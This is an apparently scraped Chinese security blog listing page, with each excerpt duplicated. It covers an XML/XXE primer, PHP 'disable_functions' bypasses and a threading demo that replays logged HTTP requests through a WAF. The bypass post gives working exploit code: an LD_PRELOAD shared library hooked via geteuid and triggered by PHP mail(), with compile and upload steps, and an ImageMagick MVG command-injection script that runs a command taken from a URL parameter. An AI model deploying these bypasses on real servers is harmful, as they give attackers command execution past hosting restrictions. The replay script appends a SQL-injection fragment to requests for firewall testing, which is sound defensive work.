	</div>
  <a type="button" href="/2018/02/02/xxe.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>XML基础：</p>
<p>XML文档结构：</p>
<pre class="line-numbers language-none"><code class="language-none">XML声明
&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;

DTD文档类型定义
&lt;!DOCTYPE note [  &lt;!--定义此文档是 note 类型的文档--&gt;
&lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!--定义note元素有四个元素--&gt;
&lt;!ELEMENT to (#PCDATA)&gt;     &lt;!--定义to元素为”#PCDATA”类型--&gt;
&lt;!ELEMENT from (#PCDATA)&gt;   &lt;!--定义from元素为”#PCDATA”类型--&gt;
&lt;!ELEMENT head (#PCDATA)&gt;   &lt;!--定义head元素为”#PCDATA”类型--&gt;
&lt;!ELEMENT body (#PCDATA)&gt;   &lt;!--定义body元素为”#PCDATA”类型--&gt;
]]]


文档元素
&lt;note&gt;
&lt;to&gt;Dave&lt;&#x2F;to&gt;
&lt;from&gt;Tom&lt;&#x2F;from&gt;
&lt;head&gt;Reminder&lt;&#x2F;head&gt;
&lt;body&gt;You are a good man&lt;&#x2F;body&gt;
&lt;&#x2F;note&gt;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>DTD(document type definitions)可以定义一个合法的XML文档构建模块，可以被成行声明于XML文档中，也可以作为一个外部引用。</p>
<pre class="line-numbers language-none"><code class="language-none">内部声明DTD：

&lt;!DOCTYPE 跟元素 [元素声明］&gt;

引用外部DTD:

&lt;!DOCTYPE 根元素  SYSTEM &quot;文件名&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>DTD文档中很多关键字如下: </p>
<ul>
<li>DOCTYPE(DTD的声明）</li>
<li>ENTITY （实体的声明）</li>
<li>SYSTEM、PUBLIC （外部资源申请） </li>
</ul>
<p>###实体</p>
<p>实体可以理解为变量，必须在DTD定义声明，可以在文档中的其它位置引用该变量的值。<br>实体按类型主要分以下四种:</p>
<ul>
<li>内置实体（Built-in entities)</li>
<li>字符实体（Character entities)</li>
<li>通用实体（General entities）</li>
<li>参数实体 (Parameter entities）</li>
</ul>
	
	</div>
  <a type="button" href="/2018/02/02/xxe.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/12/12/bypass-disabled-functions.html" >bypass disable functions</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-12-12  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://threathunter.org/topic/596d90d5dff9e14c40b61986">https://threathunter.org/topic/596d90d5dff9e14c40b61986</a></p>
<pre class="line-numbers language-none"><code class="language-none">#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
void payload() &#123;
system(&quot;echo aaaaa&gt; &#x2F;tmp&#x2F;abc.txt&quot;);
&#125;
int geteuid() &#123;
if (getenv(&quot;LD_PRELOAD&quot;) &#x3D;&#x3D; NULL) &#123; return 0; &#125; 
unsetenv(&quot;LD_PRELOAD&quot;);
payload();
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">&lt;?php 
putenv(&quot;LD_PRELOAD&#x3D;&#x2F;var&#x2F;www&#x2F;hack.so&quot;);
mail(&quot;a[@localhost](&#x2F;user&#x2F;localhost)&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p> 使用方法：</p>
<pre class="line-numbers language-none"><code class="language-none">gcc -c -fPIC hack.c -o hack
gcc -shared hack -o hack.so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>修改hack.c文件里面的内容即可执行命令，经过测试在lnmp一键安装包可以顺利执行。<br>在gcc编译的时候可以放在其他linux上面编译，好了之后上传到目标服务器。</p>
<p>====<br>2018.8.22:</p>
<p>使用imageMagick 绕过:</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;?php
echo &quot;Disable Functions: &quot; . ini_get(&#39;disable_functions&#39;) . &quot;\n&quot;;

$command &#x3D; PHP_SAPI &#x3D;&#x3D; &#39;cli&#39; ? $argv[1] : $_GET[&#39;cmd&#39;];
if ($command &#x3D;&#x3D; &#39;&#39;) &#123;
    $command &#x3D; &#39;id&#39;;
&#125;

$exploit &#x3D; &lt;&lt;&lt;EOF
push graphic-context
viewbox 0 0 640 480
fill &#39;url(https:&#x2F;&#x2F;example.com&#x2F;image.jpg&quot;|$command&quot;)&#39;
pop graphic-context
EOF;

file_put_contents(&quot;KKKK.mvg&quot;, $exploit);
$thumb &#x3D; new Imagick();
$thumb-&gt;readImage(&#39;KKKK.mvg&#39;);
$thumb-&gt;writeImage(&#39;KKKK.png&#39;);
$thumb-&gt;clear();
$thumb-&gt;destroy();
unlink(&quot;KKKK.mvg&quot;);
unlink(&quot;KKKK.png&quot;);
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>上面的比较老，最新的imagemagic漏洞:</p>
	

	</div>
  <a type="button" href="/2017/12/12/bypass-disabled-functions.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://threathunter.org/topic/596d90d5dff9e14c40b61986">https://threathunter.org/topic/596d90d5dff9e14c40b61986</a></p>
<pre class="line-numbers language-none"><code class="language-none">#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
void payload() &#123;
system(&quot;echo aaaaa&gt; &#x2F;tmp&#x2F;abc.txt&quot;);
&#125;
int geteuid() &#123;
if (getenv(&quot;LD_PRELOAD&quot;) &#x3D;&#x3D; NULL) &#123; return 0; &#125; 
unsetenv(&quot;LD_PRELOAD&quot;);
payload();
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">&lt;?php 
putenv(&quot;LD_PRELOAD&#x3D;&#x2F;var&#x2F;www&#x2F;hack.so&quot;);
mail(&quot;a[@localhost](&#x2F;user&#x2F;localhost)&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p> 使用方法：</p>
<pre class="line-numbers language-none"><code class="language-none">gcc -c -fPIC hack.c -o hack
gcc -shared hack -o hack.so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>修改hack.c文件里面的内容即可执行命令，经过测试在lnmp一键安装包可以顺利执行。<br>在gcc编译的时候可以放在其他linux上面编译，好了之后上传到目标服务器。</p>
<p>====<br>2018.8.22:</p>
<p>使用imageMagick 绕过:</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;?php
echo &quot;Disable Functions: &quot; . ini_get(&#39;disable_functions&#39;) . &quot;\n&quot;;

$command &#x3D; PHP_SAPI &#x3D;&#x3D; &#39;cli&#39; ? $argv[1] : $_GET[&#39;cmd&#39;];
if ($command &#x3D;&#x3D; &#39;&#39;) &#123;
    $command &#x3D; &#39;id&#39;;
&#125;

$exploit &#x3D; &lt;&lt;&lt;EOF
push graphic-context
viewbox 0 0 640 480
fill &#39;url(https:&#x2F;&#x2F;example.com&#x2F;image.jpg&quot;|$command&quot;)&#39;
pop graphic-context
EOF;

file_put_contents(&quot;KKKK.mvg&quot;, $exploit);
$thumb &#x3D; new Imagick();
$thumb-&gt;readImage(&#39;KKKK.mvg&#39;);
$thumb-&gt;writeImage(&#39;KKKK.png&#39;);
$thumb-&gt;clear();
$thumb-&gt;destroy();
unlink(&quot;KKKK.mvg&quot;);
unlink(&quot;KKKK.png&quot;);
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>上面的比较老，最新的imagemagic漏洞:</p>
	
	</div>
  <a type="button" href="/2017/12/12/bypass-disabled-functions.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/12/11/producer-consumer.html" >生产者消费者模型</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-12-11  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>代码捉急,先看例子:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>http<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>jianshu<span class="token punctuation">.</span>com<span class="token operator">/</span>p<span class="token operator">/</span>d85a4329d0c2<span class="token operator">></span>
<span class="token comment">#!/usr/bin/env python</span>
<span class="token comment"># -*- coding: utf-8 -*-</span>

<span class="token keyword">import</span> threading
<span class="token keyword">import</span> Queue
<span class="token keyword">import</span> random
<span class="token keyword">import</span> time


<span class="token keyword">class</span> <span class="token class-name">Producter</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""生产者线程"""</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> t_name<span class="token punctuation">,</span> queue<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>queue <span class="token operator">=</span> queue
        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token operator">=</span>t_name<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            randomnum <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>queue<span class="token punctuation">.</span>put<span class="token punctuation">(</span>randomnum<span class="token punctuation">)</span>
            <span class="token keyword">print</span> <span class="token string">'put num in Queue %s'</span> <span class="token operator">%</span>  randomnum
            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

        <span class="token keyword">print</span> <span class="token string">'put queue done'</span>


<span class="token keyword">class</span> <span class="token class-name">ConsumeEven</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""奇数消费线程"""</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> t_name<span class="token punctuation">,</span> queue<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>queue <span class="token operator">=</span> queue
        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token operator">=</span>t_name<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                queue_val <span class="token operator">=</span> self<span class="token punctuation">.</span>queue<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>
            <span class="token keyword">except</span> Exception<span class="token punctuation">,</span> e<span class="token punctuation">:</span>
                <span class="token keyword">print</span> e
                <span class="token keyword">break</span><span class="token punctuation">;</span>

            <span class="token keyword">if</span> queue_val <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span> <span class="token string">'Get Even Num %s '</span> <span class="token operator">%</span> queue_val
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>queue<span class="token punctuation">.</span>put<span class="token punctuation">(</span>queue_val<span class="token punctuation">)</span>


q <span class="token operator">=</span> Queue<span class="token punctuation">.</span>Queue<span class="token punctuation">(</span><span class="token punctuation">)</span>
pt <span class="token operator">=</span> Producter<span class="token punctuation">(</span><span class="token string">'producter'</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span>
ce <span class="token operator">=</span> ConsumeEven<span class="token punctuation">(</span><span class="token string">'consumeeven'</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span>
ce<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
pt<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
pt<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>
ce<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>照着写:</p>
<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python
# coding: utf-8

from elasticsearch import Elasticsearch
import requests
from Queue import Queue
import time
import threading
import datetime

es &#x3D; Elasticsearch(&#39;xxxxxx:9200&#39;, http_auth&#x3D;(&#39;user&#39;, &#39;password&#39;))


class Producter(threading.Thread):
	def __init__(self, queue):
		threading.Thread.__init__(self)
		self.queue &#x3D; queue
		self.initime &#x3D; datetime.datetime.now().strftime(&#39;%Y.%m.%d&#39;)


	def initsearch(self):
		dsl_query &#x3D; &#123;
		  &quot;query&quot;: &#123;
		    &quot;match&quot;: &#123;
		      &quot;method&quot;: &#123;
		        &quot;query&quot;: &quot;GET&quot;,
		        &quot;type&quot;: &quot;phrase&quot;
		      &#125;
		    &#125;
		  &#125;,
			&quot;size&quot;: 100,
		&quot;sort&quot;: [&#123;&quot;@timestamp&quot;: &#123;&quot;order&quot;: &quot;desc&quot;&#125;&#125;]
		&#125;
		res &#x3D; es.search(index&#x3D;&quot;packetbeat-&quot; + self.initime, body&#x3D;dsl_query)
		latest_time &#x3D; res[&#39;hits&#39;][&#39;hits&#39;][0][&#39;_source&#39;][&#39;@timestamp&#39;]
		return latest_time


	def run(self):
		latest_time &#x3D; self.initsearch()
		while 1:
			lastindex &#x3D; latest_time.split(&#39;T&#39;)[0].replace(&#39;-&#39;, &#39;.&#39;)  # 获取最新的index
			dsl_query2 &#x3D; &#123;
				&quot;query&quot;: &#123;
					&quot;bool&quot;: &#123;
						&quot;must&quot;: &#123;
							&quot;match&quot;: &#123;
								&quot;method&quot;: &quot;GET&quot;
							&#125;
						&#125;,
						&quot;filter&quot;: &#123;
							&quot;range&quot;: &#123;
								&quot;@timestamp&quot;: &#123;
									&quot;gte&quot;: latest_time
								&#125;
							&#125;
						&#125;
					&#125;
				&#125;,
				&quot;sort&quot;: [&#123;&quot;@timestamp&quot;: &#123;&quot;order&quot;: &quot;desc&quot;&#125;&#125;],
				&quot;size&quot;: 1000
			&#125;
			time.sleep(10)
			res2 &#x3D; es.search(index&#x3D;&quot;packetbeat-&quot; + lastindex, body&#x3D;dsl_query2)
			for hit in res2[&#39;hits&#39;][&#39;hits&#39;]:
				# print hit[&#39;_source&#39;][&#39;@timestamp&#39;], hit[&#39;_id&#39;], hit[&#39;_source&#39;][&#39;path&#39;]
				self.queue.put([hit[&#39;_source&#39;][&#39;path&#39;], hit[&#39;_source&#39;][&#39;http&#39;][&#39;request&#39;][&#39;params&#39;], hit[&#39;_source&#39;][&#39;method&#39;]])
				print &quot;Put %s&quot; % hit[&#39;_id&#39;]
				print hit[&#39;_source&#39;][&#39;@timestamp&#39;]
			latest_time &#x3D; res2[&#39;hits&#39;][&#39;hits&#39;][0][&#39;_source&#39;][&#39;@timestamp&#39;]


class Consumer(threading.Thread):
	def __init__(self, queue):
		threading.Thread.__init__(self)
		self.queue &#x3D; queue

	#
	# def http_curl(self):
	# 	# http_client &#x3D; AsyncHTTPClient()
	# 	path &#x3D; self.request[0]
	# 	param &#x3D; self.request[1]
	# 	method &#x3D; self.request[2]
	# 	if method &#x3D;&#x3D; &quot;GET&quot;:
	# 		##判断get的param是否是空
	# 		if not param:
	# 			pass
	# 		else:
	# 			rep &#x3D; requests.get(&quot;http:&#x2F;&#x2F;xxxxxx:9999&quot; + path + &#39;?&#39; + param + &quot;union select&quot;)
	# 			print &quot;Curl %s&quot; % self.request
	# 			print rep.status_code
	# 	else:
	# 		#留着写POST请求判断
	# 		pass


	def run(self):
		while 1:
			try:
				request &#x3D; self.queue.get()
				path &#x3D; request[0]
				param &#x3D; request[1]
				method &#x3D; request[2]
				if method &#x3D;&#x3D; &#39;GET&#39;:
					if not param:
						pass
					else:
						rep &#x3D; requests.get(&quot;http:&#x2F;&#x2F;xxxxx:9999&quot; + path + &#39;?&#39; + param + &quot;union select&quot;)
				#else  写POST
				print &quot;Get %s&quot; % request
				print rep.status_code
			except Exception as e:
				raise e

q &#x3D; Queue()
pt &#x3D; Producter(q)
ce &#x3D; Consumer(q)
ce.start()
pt.start()
pt.join()
ce.join()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>代码应该还有点问题，先记录下大概的流程：</p>
<p>使用: <code>packetbeat</code>在A服务器抓包，格式化之后把数据发送到B服务器，存储在elk里面，然后B服务器画图对这些请求进行分析，比如某个接口报警之类的。</p>
<p>这个时候在B服务器设置一个naxsi防火墙代理，然后把es里面的输出取出来，再发送一遍给B。经过测试，虽然这样子请求大部分都是404，但是如果请求中存在恶意payload，防火墙会记录日志。（所以这里的规则要设置的特别严格，严格到每个请求都不放过）</p>
<p>上面的脚本就是在B防火墙的转发脚本demo，测试为GET请求，因为POST请求的body没有存储到es里面，脚本的大概思路是这样的：</p>
<pre class="line-numbers language-none"><code class="language-none">因为es里面存储的数据包是这样的格式: packet-[year]-[days]
所以先得到今天的日期，随便选100条，记录最新的时间戳，此时初始化完成。

下面的请求都是基于这个时间戳来的，每隔10s，在这个时间戳的基础上，轮询请求一次es，然后组装起来发送到B服务器。
记录下每次请求的最新日期，然后请求这个index，因为packet的格式: packet-[year]-[days],所以记录下每次请求的最新时间，格式化抓取最新的时间:

latest_time &#x3D; res2[&#39;hits&#39;][&#39;hits&#39;][0][&#39;_source&#39;][&#39;@timestamp&#39;]

当es的存储数据按照大于某个时间点去筛选的时候，只会出现匹配的时间条数，所以可以把请求的size设置得大一点
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>暂时的问题：</p>
	

	</div>
  <a type="button" href="/2017/12/11/producer-consumer.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>代码捉急,先看例子:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>http<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>jianshu<span class="token punctuation">.</span>com<span class="token operator">/</span>p<span class="token operator">/</span>d85a4329d0c2<span class="token operator">></span>
<span class="token comment">#!/usr/bin/env python</span>
<span class="token comment"># -*- coding: utf-8 -*-</span>

<span class="token keyword">import</span> threading
<span class="token keyword">import</span> Queue
<span class="token keyword">import</span> random
<span class="token keyword">import</span> time


<span class="token keyword">class</span> <span class="token class-name">Producter</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""生产者线程"""</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> t_name<span class="token punctuation">,</span> queue<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>queue <span class="token operator">=</span> queue
        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token operator">=</span>t_name<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            randomnum <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>queue<span class="token punctuation">.</span>put<span class="token punctuation">(</span>randomnum<span class="token punctuation">)</span>
            <span class="token keyword">print</span> <span class="token string">'put num in Queue %s'</span> <span class="token operator">%</span>  randomnum
            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

        <span class="token keyword">print</span> <span class="token string">'put queue done'</span>


<span class="token keyword">class</span> <span class="token class-name">ConsumeEven</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""奇数消费线程"""</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> t_name<span class="token punctuation">,</span> queue<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>queue <span class="token operator">=</span> queue
        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token operator">=</span>t_name<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                queue_val <span class="token operator">=</span> self<span class="token punctuation">.</span>queue<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>
            <span class="token keyword">except</span> Exception<span class="token punctuation">,</span> e<span class="token punctuation">:</span>
                <span class="token keyword">print</span> e
                <span class="token keyword">break</span><span class="token punctuation">;</span>

            <span class="token keyword">if</span> queue_val <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span> <span class="token string">'Get Even Num %s '</span> <span class="token operator">%</span> queue_val
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>queue<span class="token punctuation">.</span>put<span class="token punctuation">(</span>queue_val<span class="token punctuation">)</span>


q <span class="token operator">=</span> Queue<span class="token punctuation">.</span>Queue<span class="token punctuation">(</span><span class="token punctuation">)</span>
pt <span class="token operator">=</span> Producter<span class="token punctuation">(</span><span class="token string">'producter'</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span>
ce <span class="token operator">=</span> ConsumeEven<span class="token punctuation">(</span><span class="token string">'consumeeven'</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span>
ce<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
pt<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
pt<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>
ce<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>照着写:</p>
<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python
# coding: utf-8

from elasticsearch import Elasticsearch
import requests
from Queue import Queue
import time
import threading
import datetime

es &#x3D; Elasticsearch(&#39;xxxxxx:9200&#39;, http_auth&#x3D;(&#39;user&#39;, &#39;password&#39;))


class Producter(threading.Thread):
	def __init__(self, queue):
		threading.Thread.__init__(self)
		self.queue &#x3D; queue
		self.initime &#x3D; datetime.datetime.now().strftime(&#39;%Y.%m.%d&#39;)


	def initsearch(self):
		dsl_query &#x3D; &#123;
		  &quot;query&quot;: &#123;
		    &quot;match&quot;: &#123;
		      &quot;method&quot;: &#123;
		        &quot;query&quot;: &quot;GET&quot;,
		        &quot;type&quot;: &quot;phrase&quot;
		      &#125;
		    &#125;
		  &#125;,
			&quot;size&quot;: 100,
		&quot;sort&quot;: [&#123;&quot;@timestamp&quot;: &#123;&quot;order&quot;: &quot;desc&quot;&#125;&#125;]
		&#125;
		res &#x3D; es.search(index&#x3D;&quot;packetbeat-&quot; + self.initime, body&#x3D;dsl_query)
		latest_time &#x3D; res[&#39;hits&#39;][&#39;hits&#39;][0][&#39;_source&#39;][&#39;@timestamp&#39;]
		return latest_time


	def run(self):
		latest_time &#x3D; self.initsearch()
		while 1:
			lastindex &#x3D; latest_time.split(&#39;T&#39;)[0].replace(&#39;-&#39;, &#39;.&#39;)  # 获取最新的index
			dsl_query2 &#x3D; &#123;
				&quot;query&quot;: &#123;
					&quot;bool&quot;: &#123;
						&quot;must&quot;: &#123;
							&quot;match&quot;: &#123;
								&quot;method&quot;: &quot;GET&quot;
							&#125;
						&#125;,
						&quot;filter&quot;: &#123;
							&quot;range&quot;: &#123;
								&quot;@timestamp&quot;: &#123;
									&quot;gte&quot;: latest_time
								&#125;
							&#125;
						&#125;
					&#125;
				&#125;,
				&quot;sort&quot;: [&#123;&quot;@timestamp&quot;: &#123;&quot;order&quot;: &quot;desc&quot;&#125;&#125;],
				&quot;size&quot;: 1000
			&#125;
			time.sleep(10)
			res2 &#x3D; es.search(index&#x3D;&quot;packetbeat-&quot; + lastindex, body&#x3D;dsl_query2)
			for hit in res2[&#39;hits&#39;][&#39;hits&#39;]:
				# print hit[&#39;_source&#39;][&#39;@timestamp&#39;], hit[&#39;_id&#39;], hit[&#39;_source&#39;][&#39;path&#39;]
				self.queue.put([hit[&#39;_source&#39;][&#39;path&#39;], hit[&#39;_source&#39;][&#39;http&#39;][&#39;request&#39;][&#39;params&#39;], hit[&#39;_source&#39;][&#39;method&#39;]])
				print &quot;Put %s&quot; % hit[&#39;_id&#39;]
				print hit[&#39;_source&#39;][&#39;@timestamp&#39;]
			latest_time &#x3D; res2[&#39;hits&#39;][&#39;hits&#39;][0][&#39;_source&#39;][&#39;@timestamp&#39;]


class Consumer(threading.Thread):
	def __init__(self, queue):
		threading.Thread.__init__(self)
		self.queue &#x3D; queue

	#
	# def http_curl(self):
	# 	# http_client &#x3D; AsyncHTTPClient()
	# 	path &#x3D; self.request[0]
	# 	param &#x3D; self.request[1]
	# 	method &#x3D; self.request[2]
	# 	if method &#x3D;&#x3D; &quot;GET&quot;:
	# 		##判断get的param是否是空
	# 		if not param:
	# 			pass
	# 		else:
